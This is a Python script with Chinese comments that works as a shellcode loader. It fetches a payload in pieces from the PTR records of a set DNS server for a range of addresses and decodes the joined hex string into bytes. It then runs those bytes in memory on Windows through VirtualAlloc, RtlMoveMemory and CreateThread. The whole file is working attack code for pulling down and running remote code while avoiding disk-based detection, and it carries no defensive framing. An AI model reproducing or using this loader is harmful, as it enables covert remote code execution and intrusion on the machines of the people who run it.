import dns.resolver
import dns.reversename
import ctypes

dnsip='192.168.111.135'

def LoadshellCode(shellcode):   #执行shellcode
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000),ctypes.c_int(0x40))
    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr),buf,ctypes.c_int(len(shellcode)))
    handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_uint64(ptr),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1))

def requestptr(dnsip,ipnum):      #获取PTR记录
    ipaddr='192.168.111.%d' %ipnum    #添加的PTR记录中主机ip地址的C段地址
    ip=dns.reversename.from_address(ipaddr)
    my_resolver = dns.resolver.Resolver()
    my_resolver.nameservers = [dnsip]
    answer = my_resolver.resolve(ip,'PTR')
    recvptr=str(answer[0]).strip('.')
    return recvptr

def str2hex(shellcodedemo):    #将得到的shellcode转为十六进制
    s=''
    s1=b''
    for i in range(int(len(shellcodedemo))):
        if i % 2 == 0:
            s1 += bytes.fromhex(shellcodedemo[i:i + 2])
    return bytearray(s1)

if __name__=='__main__':
    s=''
    for i in range(20,60):    #根据添加的ip范围进行请求，192.168.111.20-192.168.111.59对应range(20,60)
        s+=requestptr(dnsip,i)
    LoadshellCode(str2hex(s))